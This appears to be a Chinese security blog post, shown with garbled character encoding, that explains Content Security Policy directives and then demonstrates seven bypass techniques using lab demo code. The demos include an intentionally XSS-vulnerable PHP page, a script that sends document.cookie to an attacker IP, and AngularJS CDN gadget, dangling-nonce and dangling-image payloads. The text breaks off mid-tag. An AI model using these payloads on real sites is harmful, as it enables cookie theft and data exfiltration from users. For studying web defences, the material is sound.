        <content type="html"><![CDATA[<p>XSSæ˜¯æœ€å¸¸è§ã€å±å®³æœ€å¤§çš„ç½‘é¡µå®‰å…¨æ¼æ´ï¼Œæƒ³è¦æŠµå¾¡å®ƒä»¬ï¼Œè¦é‡‡å–éå¸¸å¤šç¼–ç¨‹æªæ–½ï¼Œéå¸¸éº»çƒ¦ã€‚é‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰å¯ä»¥ä»æ ¹æœ¬ä¸Šè§£å†³é—®é¢˜ï¼Œæµè§ˆå™¨è‡ªåŠ¨ç¦æ­¢å¤–éƒ¨æ³¨å…¥æ¶æ„è„šæœ¬çš„æ–¹æ³•å‘¢ï¼ŸCSPåº”è¿è€Œç”Ÿã€‚</p><h2 id="ä»€ä¹ˆæ˜¯CSP"><a href="#ä»€ä¹ˆæ˜¯CSP" class="headerlink" title="ä»€ä¹ˆæ˜¯CSP"></a>ä»€ä¹ˆæ˜¯CSP</h2><p>CSPï¼ˆContent Security Policyï¼Œå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰ï¼Œæ˜¯ç½‘é¡µåº”ç”¨ä¸­å¸¸è§çš„ä¸€ç§å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œå®ƒå®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ï¼Œå¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œï¼Œå“ªäº›ä¸å¯ä»¥ã€‚</p><h2 id="CSPç­–ç•¥ç»„æˆ"><a href="#CSPç­–ç•¥ç»„æˆ" class="headerlink" title="CSPç­–ç•¥ç»„æˆ"></a>CSPç­–ç•¥ç»„æˆ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;æŒ‡ä»¤èŒƒå›´&gt; &lt;å†…å®¹æº&gt; </span><br></pre></td></tr></table></figure><h3 id="æŒ‡ä»¤èŒƒå›´"><a href="#æŒ‡ä»¤èŒƒå›´" class="headerlink" title="æŒ‡ä»¤èŒƒå›´"></a>æŒ‡ä»¤èŒƒå›´</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">script-srcï¼šå¤–éƒ¨è„šæœ¬</span><br><span class="line">style-srcï¼šæ ·å¼è¡¨</span><br><span class="line">img-srcï¼šå›¾åƒ</span><br><span class="line">media-srcï¼šåª’ä½“æ–‡ä»¶ï¼ˆéŸ³é¢‘å’Œè§†é¢‘ï¼‰</span><br><span class="line">font-srcï¼šå­—ä½“æ–‡ä»¶</span><br><span class="line">object-srcï¼šæ’ä»¶ï¼ˆæ¯”å¦‚ Flashï¼‰</span><br><span class="line">child-srcï¼šæ¡†æ¶</span><br><span class="line">frame-ancestorsï¼šåµŒå…¥çš„å¤–éƒ¨èµ„æºï¼ˆæ¯”å¦‚&lt;frame&gt;ã€&lt;iframe&gt;ã€&lt;embed&gt;å’Œ&lt;applet&gt;ï¼‰</span><br><span class="line">connect-srcï¼šHTTP è¿æ¥ï¼ˆé€šè¿‡ XHRã€WebSocketsã€EventSourceç­‰ï¼‰</span><br><span class="line">worker-srcï¼šworkerè„šæœ¬</span><br><span class="line">manifest-srcï¼šmanifest æ–‡ä»¶</span><br><span class="line">dedault-srcï¼šé»˜è®¤é…ç½®</span><br><span class="line">frame-ancestorsï¼šé™åˆ¶åµŒå…¥æ¡†æ¶çš„ç½‘é¡µ</span><br><span class="line">base-uriï¼šé™åˆ¶&lt;base#href&gt;</span><br><span class="line">form-actionï¼šé™åˆ¶&lt;form#action&gt;</span><br><span class="line">block-all-mixed-contentï¼šHTTPS ç½‘é¡µä¸å¾—åŠ è½½ HTTP èµ„æºï¼ˆæµè§ˆå™¨å·²ç»é»˜è®¤å¼€å¯ï¼‰</span><br><span class="line">upgrade-insecure-requestsï¼šè‡ªåŠ¨å°†ç½‘é¡µä¸Šæ‰€æœ‰åŠ è½½å¤–éƒ¨èµ„æºçš„ HTTP é“¾æ¥æ¢æˆ HTTPS åè®®</span><br><span class="line">plugin-typesï¼šé™åˆ¶å¯ä»¥ä½¿ç”¨çš„æ’ä»¶æ ¼å¼</span><br><span class="line">sandboxï¼šæµè§ˆå™¨è¡Œä¸ºçš„é™åˆ¶ï¼Œæ¯”å¦‚ä¸èƒ½æœ‰å¼¹å‡ºçª—å£ç­‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="å†…å®¹æº"><a href="#å†…å®¹æº" class="headerlink" title="å†…å®¹æº"></a>å†…å®¹æº</h3><p>å†…å®¹æºä¸»è¦ç”±[æºåˆ—è¡¨] [å…³é”®å­—] [æ•°æ®]ç»„æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">å…³é”®å­—(éœ€è¦ç”¨å•å¼•å·åŒ…è£¹)</span><br><span class="line">&#39;none&#39;</span><br><span class="line">ä»£è¡¨ç©ºé›†ï¼›å³ä¸åŒ¹é…ä»»ä½• URL</span><br><span class="line">&#39;self&#39;</span><br><span class="line">ä»£è¡¨å’Œæ–‡æ¡£åŒæºï¼ŒåŒ…æ‹¬ç›¸åŒçš„ URL åè®®å’Œç«¯å£å·</span><br><span class="line">&#39;unsafe-inline&#39;</span><br><span class="line">å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”çš„&lt;script&gt;å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„&lt;style&gt;å…ƒç´ </span><br><span class="line">&#39;unsafe-eval&#39;</span><br><span class="line">å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•</span><br><span class="line">*</span><br><span class="line">æ˜Ÿå·è¡¨ç¤ºå…è®¸ä»»ä½•URLèµ„æºï¼Œæ²¡æœ‰é™åˆ¶</span><br><span class="line">æºåˆ—è¡¨</span><br><span class="line">http:&#x2F;&#x2F;*.foo.com ï¼ˆåŒ¹é…æ‰€æœ‰ä½¿ç”¨ httpåè®®åŠ è½½ foo.com ä»»ä½•å­åŸŸåçš„å°è¯•ã€‚ï¼‰</span><br><span class="line">mail.foo.com:443 ï¼ˆåŒ¹é…æ‰€æœ‰è®¿é—® mail.foo.com çš„ 443 ç«¯å£ çš„å°è¯•ã€‚ï¼‰</span><br><span class="line">https:&#x2F;&#x2F;store.foo.com ï¼ˆåŒ¹é…æ‰€æœ‰ä½¿ç”¨ httpsåè®®è®¿é—® store.foo.com çš„å°è¯•ã€‚ï¼‰</span><br><span class="line">......    </span><br><span class="line">æ•°æ®</span><br><span class="line">data:</span><br><span class="line">ä»…å…è®¸æ•°æ®æ¨¡å¼ï¼ˆå¦‚Base64ç¼–ç çš„å›¾ç‰‡ï¼‰æ–¹å¼åŠ è½½èµ„æº</span><br><span class="line">mediastream:</span><br><span class="line">å…è®¸mediastream: URIä½œä¸ºå†…å®¹æ¥æº</span><br></pre></td></tr></table></figure><h3 id="å®ç°demo"><a href="#å®ç°demo" class="headerlink" title="å®ç°demo"></a>å®ç°demo</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡å“åº”å¤´å®ç°ï¼š</span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;<span class="comment">&lt;!--å…³é”®å­—ä½œä¸ºå†…å®¹æº--&gt;</span></span><br><span class="line">Content-Security-policy: default-src &#x27;self&#x27;; script-src allowed.com;<span class="comment">&lt;!--æºåˆ—è¡¨ä½œä¸ºå†…å®¹æº--&gt;</span></span><br><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream: <span class="comment">&lt;!--æ•°æ®ä½œä¸ºå†…å®¹æº--&gt;</span></span><br><span class="line">é€šè¿‡htmlå…ƒæ ‡ç­¾å®ç°ï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h2><p>æœ¬æ–‡æœªè¯´æ˜ä»£ç çš„ä¾‹å­ç”±ä¸‹é¢demoä»£ç æ”¹é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;session&#x27;</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;session&#x27;</span>,md5(rand(<span class="number">0</span>,<span class="number">1000</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;unsafe-inline&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your POST content&quot;</span>.@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x01-é‡å®šå‘ç»•è¿‡"><a href="#0x01-é‡å®šå‘ç»•è¿‡" class="headerlink" title="0x01 é‡å®šå‘ç»•è¿‡"></a>0x01 é‡å®šå‘ç»•è¿‡</h3><p><strong>æ¡ä»¶</strong></p><p>1.å¯ä»¥æ‰§è¡Œä»»æ„jsè„šæœ¬ï¼Œä½†ç”±äºCSPæ— æ³•æ•°æ®å¤–å¸¦</p><p>2.CSPä¸º<code>script-src &#39;unsafe-inline&#39;</code></p><p><strong>ç»•è¿‡æ–¹æ³•</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://10.146.110.37:7777?&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--ä¹Ÿå¯ç”¨window.location/window.open()è·³è½¬æ–¹æ³•å¤–å¸¦æ•°æ®--&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160730764.png" class="" title="image-20210614160730764"><h3 id="0x02-metaç½‘é¡µè·³è½¬ç»•è¿‡"><a href="#0x02-metaç½‘é¡µè·³è½¬ç»•è¿‡" class="headerlink" title="0x02 metaç½‘é¡µè·³è½¬ç»•è¿‡"></a>0x02 metaç½‘é¡µè·³è½¬ç»•è¿‡</h3><p><strong>ç»•è¿‡æ¡ä»¶</strong></p><p>æ— </p><p><strong>ç»•è¿‡æ–¹æ³•ï¼ˆåªèƒ½è·³è½¬ï¼Œæ— æ³•æºå¸¦æ•°æ®ï¼‰</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://10.146.110.37:7777&quot;</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614160921062.png" class="" title="image-20210614160921062"><h3 id="0x03-iframeæ ‡ç­¾ç»•è¿‡"><a href="#0x03-iframeæ ‡ç­¾ç»•è¿‡" class="headerlink" title="0x03 iframeæ ‡ç­¾ç»•è¿‡"></a>0x03 iframeæ ‡ç­¾ç»•è¿‡</h3><p><strong>æ¡ä»¶</strong></p><p>1.ä¸€ä¸ªåŒæºç«™ç‚¹å­˜åœ¨ä¸¤ä¸ªé¡µé¢ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰CSPä¿æŠ¤ï¼Œä¸€ä¸ªæ²¡æœ‰ä¸”å­˜åœ¨xssæ¼æ´</p><p>2.æˆ‘ä»¬è¦çš„æ•°æ®åœ¨å­˜åœ¨CSPä¿æŠ¤çš„é¡µé¢ä¸­</p><p><strong>ç»•è¿‡æ–¹æ³•</strong></p><p>Bé¡µé¢åˆ©ç”¨iframeåŠ è½½Aé¡µé¢ï¼Œç»•è¿‡Aé¡µé¢CSPç­–ç•¥ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--A.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--B.html--&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);iframe.src=<span class="string">&quot;http://localhost/CSP/demo3/A.html&quot;</span>;<span class="built_in">document</span>.body.appendChild(iframe);<span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);<span class="comment">//setTimeoutæ˜¯ä¸ºäº†ç­‰å¾…iframeåŠ è½½å®Œæˆ</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614161923694.png" class="" title="image-20210614161923694"><p><strong>å…¶ä»–åˆ©ç”¨æ–¹æ³•</strong></p><p>åœ¨Chromeä¸‹ï¼Œiframeæ ‡ç­¾æ”¯æŒcspå±æ€§ï¼Œè¿™æœ‰æ—¶å€™å¯ä»¥ç”¨æ¥ç»•è¿‡ä¸€äº›é˜²å¾¡ï¼Œä¾‹å¦‚â€http://xxxâ€é¡µé¢æœ‰ä¸ªjsåº“ä¼šè¿‡æ»¤XSSå‘é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨cspå±æ€§æ¥ç¦æ‰è¿™ä¸ªjsåº“ï¼š<code>&lt; iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></p><h3 id="0x04-CDNç»•è¿‡"><a href="#0x04-CDNç»•è¿‡" class="headerlink" title="0x04 CDNç»•è¿‡"></a>0x04 CDNç»•è¿‡</h3><p>ä¸€èˆ¬æ¥è¯´ï¼Œå‰ç«¯è¦ç”¨åˆ°è®¸å¤šçš„å‰ç«¯æ¡†æ¶å’Œåº“ï¼Œè€Œéƒ¨åˆ†ä¼ä¸šä¸ºäº†æ•ˆç‡æˆ–è€…å…¶ä»–åŸå› ï¼Œä¼šé€‰æ‹©ä½¿ç”¨å…¶ä»–CDNä¸Šçš„jsæ¡†æ¶ï¼Œå½“è¿™äº›CDNä¸Šå­˜åœ¨ä¸€äº›ä½ç‰ˆæœ¬çš„æ¡†æ¶æ—¶ï¼Œå°±å¯èƒ½å­˜åœ¨ç»•è¿‡CSPçš„é£é™©</p><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><p>1.è¯¥CDNæœåŠ¡å•†åœ¨CSPç™½åå•ä¸­</p><p>2.CDNæœåŠ¡å•†å­˜åœ¨ä½ç‰ˆæœ¬çš„jsåº“</p><p><strong>demo</strong></p><p>cspè®¾ç½®</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content-security-policy: script-src &#x27;self&#x27; vimeo.com &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com </span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> </span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162055744.png" class="" title="image-20210614162055744"><p>è¿™é‡Œçš„ç»•è¿‡æ–¹æ³•è¯¦ç»†è¯´æ˜å¯ä»¥å‚è€ƒé“¾æ¥</p><p><a class="link"   href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" >https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://github.com/google/security-research-pocs/tree/master/script-gadgets" >https://github.com/google/security-research-pocs/tree/master/script-gadgets<i class="fas fa-external-link-alt"></i></a></p><h3 id="0x05-ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡"><a href="#0x05-ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡" class="headerlink" title="0x05 ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡"></a>0x05 ä¸å®Œæ•´scriptæ ‡ç­¾ç»•è¿‡</h3><p><strong>æ¡ä»¶</strong></p><p>1.å¯æ§ç‚¹åœ¨åˆæ³•scriptæ ‡ç­¾ä¸Šæ–¹,ä¸”å…¶ä¸­æ²¡æœ‰å…¶ä»–æ ‡ç­¾</p><p>2.XSSé¡µé¢çš„CSP <code>script-src</code>åªé‡‡ç”¨äº†<code>nonce</code>æ–¹å¼</p><p><strong>demo</strong></p><p>cspè®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;; script-src &#39;nonce-xxxxx&#39;&quot;&gt;&lt;?php echo $_GET[&#39;a&#39;]?&gt;</span><br><span class="line">&lt;script nonce&#x3D;&#39;xxxxx&#39;&gt;  &#x2F;&#x2F;do some thing&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹æ³•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/plain,alert(1)</span></span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°&lt;scriptå°±ä¼šè¢«å˜æˆä¸€ä¸ªå±æ€§ï¼Œå€¼ä¸ºç©ºï¼Œä¹‹åçš„<code>nonce=&#39;xxxxx&#39;</code>ä¼šè¢«å½“æˆæˆ‘ä»¬è¾“å…¥çš„scriptæ ‡ç­¾ä¸­çš„ä¸€ä¸ªå±æ€§ï¼ŒæˆåŠŸç»•è¿‡<code>script-src</code>ï¼Œ<code>&lt;/script</code>å°±ä¼šè¢«å˜æˆä¸€ä¸ªå±æ€§ï¼Œå€¼ä¸ºç©º</p><p>ç«ç‹æµè§ˆå™¨</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162119762.png" class="" title="image-20210614162119762"><p>ä¸Šè¿°ç»•è¿‡æ–¹æ³•åœ¨chromeæµè§ˆå™¨ä¸ç”Ÿæ•ˆï¼Œå› ä¸ºåœ¨chromeä¸­ï¼Œè™½ç„¶ç¬¬äºŒä¸ª&lt;script è¢«å½“æˆäº†å±æ€§åï¼Œä½†ä¾æ—§ä¼šå¹²æ‰°chromeå¯¹æ ‡ç­¾çš„è§£æï¼Œé€ æˆé”™è¯¯ï¼Œä½¿æˆ‘ä»¬çš„expæ— æ³•æˆåŠŸæ‰§è¡Œã€‚è¿™é‡Œå¯ä»¥ç”¨åˆ°æ ‡ç­¾çš„ä¸€ä¸ªæŠ€å·§ï¼Œå½“ä¸€ä¸ªæ ‡ç­¾å­˜åœ¨ä¸¤ä¸ªåŒåå±æ€§æ—¶ï¼Œç¬¬äºŒä¸ªå±æ€§çš„å±æ€§ååŠå…¶å±æ€§å€¼éƒ½ä¼šè¢«æµè§ˆå™¨å¿½ç•¥ã€‚</p><p>ä¾‹å¦‚<code>&lt;h1 a=&quot;123&quot; b=&quot;456&quot; a=&quot;789&quot; a=&quot;abc&quot;&gt;123&lt;/h1&gt;</code>ï¼Œè¿™é‡Œaå±æ€§çš„å€¼ä¸º123ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹pyaloadç»•è¿‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=123<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:text/plain,alert(1)&quot;</span> <span class="attr">a</span>=<span class="string">123</span> <span class="attr">a</span>= </span></span><br></pre></td></tr></table></figure><p>å…ˆæ–°å»ºä¸€ä¸ªaå±æ€§ï¼Œç„¶åå†æ–°å»ºç¬¬äºŒä¸ªaå±æ€§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å°†ç¬¬äºŒä¸ª&lt;scriptèµ‹ç»™äº†ç¬¬äºŒä¸ªaå±æ€§</p><p>chromeæµè§ˆå™¨</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162131003.png" class="" title="image-20210614162131003"><p>è¿™é‡ŒæŸ¥çœ‹é¡µé¢æ ‡ç­¾å·²ç»åµŒå…¥æˆåŠŸï¼Œä½†srcå´æ‰§è¡Œä¸äº†å°±å¾ˆå¥‡æ€ª</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162138551.png" class="" title="image-20210614162138551"><h3 id="0x06-ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº"><a href="#0x06-ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº" class="headerlink" title="0x06 ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº"></a>0x06 ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº</h3><p><strong>æ¡ä»¶</strong></p><p>1.å¯ä»¥åŠ è½½å¤–åŸŸèµ„æº (<code>img-src: *</code>)</p><p>2.éœ€è¦è·å–é¡µé¢æŸå¤„çš„ä¿¡æ¯</p><p><strong>demo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;default-src &#39;self&#39;;script-src &#39;self&#39;; img-src *;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2 id&#x3D;&quot;id&quot;&gt;3&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹æ³•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/csp.php?xss=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip?a=</span></span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œsrcåªæœ‰å·¦è¾¹çš„å¼•å·</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162156829.png" class="" title="image-20210614162156829"><p>chormeä¸‹è¯¥payloadå¹¶ä¸ä¼šæˆåŠŸï¼Œå› ä¸ºchromeä¸å…è®¸å‘å‡ºçš„urlä¸­å«æœ‰å›è½¦æˆ–&lt;</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162208999.png" class="" title="image-20210614162208999"><h3 id="0x07-ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡"><a href="#0x07-ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡" class="headerlink" title="0x07 ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡"></a>0x07 ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</h3><p><strong>æ¡ä»¶</strong></p><p>1.å¯æ§çš„é™æ€èµ„æºç«™ç‚¹åœ¨ç™½åå•å†…</p><p><strong>demo</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹æ³•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;</span><span class="tag">&lt;/<span 